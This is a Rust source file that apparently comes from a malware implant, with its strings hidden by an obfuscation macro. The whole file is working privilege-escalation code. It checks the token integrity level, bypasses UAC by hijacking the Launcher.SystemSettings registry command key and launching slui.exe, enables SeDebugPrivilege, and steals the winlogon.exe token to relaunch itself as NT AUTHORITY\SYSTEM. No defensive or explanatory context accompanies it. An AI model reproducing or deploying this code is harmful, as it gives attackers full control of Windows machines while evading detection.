use anyhow::{Result, Context, bail};

use winapi::um::processthreadsapi::{OpenProcessToken, GetCurrentProcess, OpenProcess, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::winnt::{TokenIntegrityLevel, TOKEN_MANDATORY_LABEL, SecurityImpersonation, TokenPrimary, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, PROCESS_ALL_ACCESS,  HANDLE, LUID, TOKEN_PRIVILEGES, TOKEN_QUERY, TOKEN_ADJUST_PRIVILEGES, SE_PRIVILEGE_ENABLED};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winbase::{CREATE_NEW_CONSOLE, CreateProcessWithTokenW, LOGON_WITH_PROFILE, CREATE_NO_WINDOW, LookupPrivilegeValueW};
use winapi::um::handleapi::CloseHandle;
use winapi::um::securitybaseapi::{DuplicateTokenEx, AdjustTokenPrivileges, GetTokenInformation, GetSidSubAuthority, GetSidSubAuthorityCount};

use winreg::RegKey;
use winapi::um::winreg::{HKEY_CURRENT_USER};
use winapi::um::winuser::SW_SHOW;
use winapi::um::shellapi::ShellExecuteW;
use winapi::ctypes::c_void;

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use crate::modules::ps;
use crate::obfuscate;


//////// Privileges

pub async fn privs() -> Result<u32> {
    let mut level = String::new();

    let mut token: HANDLE = ptr::null_mut();
    unsafe {
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            let e = format!("{} 0x{:08X}", obfuscate!("Failed to open process token : "), GetLastError());
            bail!(e);
        }
    
        let mut size = 0;
        GetTokenInformation(
            token,
            TokenIntegrityLevel,
            ptr::null_mut(),
            0,
            &mut size
            );

        let mut token_information = vec![0u8; size as usize];

        if GetTokenInformation(
                token, 
                TokenIntegrityLevel,
                token_information.as_mut_ptr() as *mut _,
                size,
                &mut size,
            ) == 0 {
            CloseHandle(token);
            let e = format!("{} 0x{:08X}", obfuscate!("Failed to get token information : "), GetLastError());
            bail!(e);
        }

        let til = token_information.as_ptr() as *const TOKEN_MANDATORY_LABEL;
        let sid = (*til).Label.Sid;
        let count = *GetSidSubAuthorityCount(sid) as u32;
        let attr  = *GetSidSubAuthority(sid, count - 1);
        
        Ok(attr)
    }
}

/*
//////// User -> Administrator
pub async fn user_to_admin() -> Result<()> {}

*/



//////// Administrator: Medium Integrity -> High Integrity
pub async fn bypass_uac() -> Result<()> {

    let del  : &str = &obfuscate!("DelegateExecute");
    let slui : &str = &obfuscate!("C:\\Windows\\System32\\slui.exe");

    let privs = privs().await?;
    match privs {
        0x2000 => {
            // Set the DelegateExecute registry key to an empty value
            create_key(Some(del), "").await?;

            let current_exe = match std::env::current_exe() {
                Ok(exe) => exe.to_string_lossy().to_string(),
                Err(e) => {
                    let err = format!("{}{:?}", obfuscate!("[!] Failed to get current executable path: "), e);
                    bail!(err);
                }
            };

            // Set the command registry key to point to VEN0m
            create_key(None, &current_exe).await?;
            // Trigger the execution
            run_as_admin(slui).await?;
            std::process::exit(0);    
        }
        0x1000 => bail!(obfuscate!("The program is running as Normal User!")),
        0x3000 | 0x4000 => return Ok(()),
        _ => {}
    }
    Ok(())
}

async fn create_key(key: Option<&str>, value: &str) -> Result<()> {
    
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = obfuscate!("Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command");

    // Create the reg key
    let (reg_key, _) = hkcu.create_subkey(path)?;

    // Set the value
    match key {
        Some(k) => reg_key.set_value(k, &value)?,
        None => reg_key.set_value("", &value)?,
    }

    Ok(())
}

async fn run_as_admin(executable: &str) -> Result<()> {
    let executable_wide: Vec<u16> = OsStr::new(executable).encode_wide().chain(Some(0)).collect();

    // Use ShellExecuteW with the "runas" verb to trigger UAC
    let result = unsafe {
        ShellExecuteW(
            ptr::null_mut(),
            "runas\0".encode_utf16().collect::<Vec<u16>>().as_ptr(),
            executable_wide.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            SW_SHOW,
        )
    };

    if result as usize <= 32 {
        bail!(obfuscate!("[!] Failed to run as Administrator!"));
    }

    Ok(())
}

//////// Administrator -> NT Authority\system

pub async fn se_debug() -> Result<()> {
    
    let mut token: HANDLE = ptr::null_mut();
    unsafe {
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,  &mut token) == 0 {
            let e = format!("{}{}", obfuscate!("Failed to open process token : "), GetLastError());
            bail!(e);
        }   
    
    let mut luid: LUID = std::mem::zeroed();
    let priv_name: Vec<u16> = OsStr::new(&obfuscate!("SeDebugPrivilege")).encode_wide().chain(std::iter::once(0)).collect();


        if LookupPrivilegeValueW(ptr::null_mut(), priv_name.as_ptr(), &mut luid) == 0 {
            let e = format!("{}{}", obfuscate!("Failed to lookup privilge value: "), GetLastError());
            bail!(e)
        }

    let mut token_privs: TOKEN_PRIVILEGES = std::mem::zeroed();
    token_privs.PrivilegeCount = 1;
    token_privs.Privileges[0].Luid = luid;
    token_privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if AdjustTokenPrivileges(token, false as i32, &mut token_privs, std::mem::size_of::<TOKEN_PRIVILEGES>() as u32, ptr::null_mut(), ptr::null_mut()) == 0 {
            let e = format!("{}{}", obfuscate!("Failed to adjust token privileges : "), GetLastError());
            bail!(e);
        }
    } 

    Ok(())
}

pub async fn get_system() -> Result<()> {
    
    let privs = privs().await?;
    match privs {
        0x1000 => bail!(obfuscate!("The program is running as with Normal User privileges!")),
        0x4000 => return Ok(()),
        _ => {
            bypass_uac().await?;
            // Enabling SeDebugPrivileges
            if let Err(e) = se_debug().await {
                bail!("{e}");
            };

            // winlogon.exe runs as SYSTEM and is perfect for impersonation
            let pid = ps::pid_by_name(&obfuscate!("winlogon.exe")).await?;
            unsafe {    
                let hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
                if hProcess.is_null() {
                    let e = format!("{}0x{:08X}", obfuscate!("Failed to get a handle to the winlogon.exe process : "), GetLastError());
                    bail!(e);
                
                }
                
                let mut sys_token: HANDLE = ptr::null_mut(); 
                if OpenProcessToken(hProcess, TOKEN_DUPLICATE |TOKEN_QUERY, &mut sys_token) == 0 {
                        CloseHandle(hProcess);
                        let e = format!("{} 0x{:08X}", obfuscate!("Failed to open the system process token :"), GetLastError());
                        bail!(e);
                    }

                let mut dup_token: HANDLE = ptr::null_mut();
                if DuplicateTokenEx(sys_token, TOKEN_ALL_ACCESS, ptr::null_mut(), SecurityImpersonation, TokenPrimary, &mut dup_token) == 0 {
                    CloseHandle(sys_token);
                    CloseHandle(hProcess);
                    let e = format!("{} 0x{:08X}", obfuscate!("Failed to duplicate system token :"), GetLastError());
                    bail!(e);
                }

                let exe_name = std::env::current_exe()?;
                let wide_name: Vec<u16> = OsStr::new(&exe_name).encode_wide().chain(std::iter::once(0)).collect();

                let mut startup_info: STARTUPINFOW = std::mem::zeroed();
                let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

                if CreateProcessWithTokenW(
                            dup_token,
                            LOGON_WITH_PROFILE,
                            wide_name.as_ptr(),
                            ptr::null_mut(),
                            CREATE_NEW_CONSOLE,
                            ptr::null_mut(),
                            ptr::null_mut(),
                            &mut startup_info,
                            &mut process_info
                        ) == 0 {
                        CloseHandle(dup_token);
                        CloseHandle(sys_token);
                        CloseHandle(hProcess);
                        let e = format!("{}{}", obfuscate!("Failed to create a process with the duplicated system token : "), GetLastError());
                        bail!(e);
                    }

                CloseHandle(dup_token);
                CloseHandle(sys_token);
                CloseHandle(hProcess);    

                std::process::exit(0);
            }
        }   
    }

    Ok(())
}
